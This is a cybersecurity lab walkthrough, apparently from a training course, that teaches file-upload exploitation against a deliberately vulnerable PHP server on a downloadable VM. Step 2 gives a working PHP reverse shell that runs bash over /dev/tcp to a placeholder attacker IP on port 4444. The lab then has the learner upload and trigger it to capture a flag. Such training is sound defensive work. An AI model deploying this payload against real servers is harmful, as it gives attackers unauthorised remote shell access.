# Reverse Shell on a Web Server

In this lab, you will practice using a **reverse shell** to remotely take control of a vulnerable server. Your mission is to identify a poorly secured form, upload a malicious file, and capture a flag hosted on the system. In this lab, you will learn:

- Detecting forms without type validation
- Uploading malicious files
- Executing a reverse shell in PHP
- Gaining remote control with `netcat`

<how-to-start>
   
## 🌱 How to Start This Lab

Follow these instructions to get started:

1. **Download the virtual machine** from this [link](https://storage.googleapis.com/cybersecurity-machines/reverse-lab.ova).
2. **Import the machine** into your preferred virtualization manager (VirtualBox, VMware, etc.).
3. Once the machine is running, you can start the lab!

</how-to-start>

## 📄 Instructions

The server hosts a website developed in PHP, accessible via a browser, which contains a form that does not validate the type of uploaded files. Your task is to prepare a functional reverse shell and get the server to connect back to your machine.

1. **Explore the vulnerable website**: Access the machine's IP from your browser and locate the file upload form.

2. **Prepare your reverse shell in PHP**: Create a file named `shell.php` with the following content:

     ```php
     <?php
     exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'");
     ?>
     ```

   - Replace `YOUR_IP` with the IP of your attacking machine.

3. **Start a listener on your machine**

4. **Upload the reverse shell to the server**

5. **Activate the reverse connection**: Access the uploaded file through the browser. If everything is set up correctly, you will receive an interactive shell in your terminal.

**Remember:** You are in a controlled environment for educational purposes. Ethical knowledge is your best tool. Observe, explore, and learn to identify insecure configurations.

Happy hacking!
